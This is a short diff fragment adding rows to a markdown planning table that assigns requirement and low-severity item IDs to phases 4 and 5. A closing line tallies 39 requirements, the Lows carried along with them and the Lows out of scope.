+| 4 | M00, M02, M03, M09, M15, M16, M17, M18, M19, M26, M27 | L-01, L-02 (partial), L-06, L-20, L-22 (partial) |
+| 5 | H08, M25, M28, M29, M30 | L-02, L-25 |
+
+Counts: 7 + 9 + 7 + 11 + 5 = 39 requirements; 20 Lows ride along (2 partial); 4 Lows out of scope (L-11, L-13, L-17, L-19); 24 open Lows accounted for.
